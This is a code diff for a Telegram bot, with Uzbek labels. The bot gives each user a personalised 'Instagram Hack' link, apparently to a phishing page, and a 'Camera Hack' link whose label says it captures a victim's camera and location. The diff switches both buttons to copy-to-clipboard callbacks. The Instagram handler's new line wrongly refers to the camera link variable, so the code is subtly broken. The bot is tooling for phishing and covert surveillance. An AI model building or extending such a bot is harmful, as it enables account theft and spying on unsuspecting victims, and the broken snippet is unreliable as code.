@@ -128,7 +128,7 @@ bot.hears("📷 Instagram Hack", async (ctx) => {
   const instagramHackLink = `https://${HOST}/insta/${ctx.from.id}`;
   await ctx.reply(`Instagram hack havolasi: ${instagramHackLink}`, {
     reply_markup: {
-      inline_keyboard: [[{ text: "📷 Instagram hack havola", url: instagramHackLink }]]
+      inline_keyboard: [[{ text: "📷 Instagram hack havola", callback_data: `copy_${cameraHackLink}` }]]
     }
   });
 });
@@ -137,7 +137,9 @@ bot.hears("📸 Camera Hack", async (ctx) => {
   const cameraHackLink = `https://${HOST}/r/${ctx.from.id}`;
   await ctx.reply(`Camera va lokatsiya hack havolasi: ${cameraHackLink}`, {
     reply_markup: {
-      inline_keyboard: [[{ text: "🔗 Camera hack havola", url: cameraHackLink }]]
+      inline_keyboard: [
+        [{ text: "📋 Nusxa olish", callback_data: `copy_${cameraHackLink}` }]
+      ]
     }
   });
 });
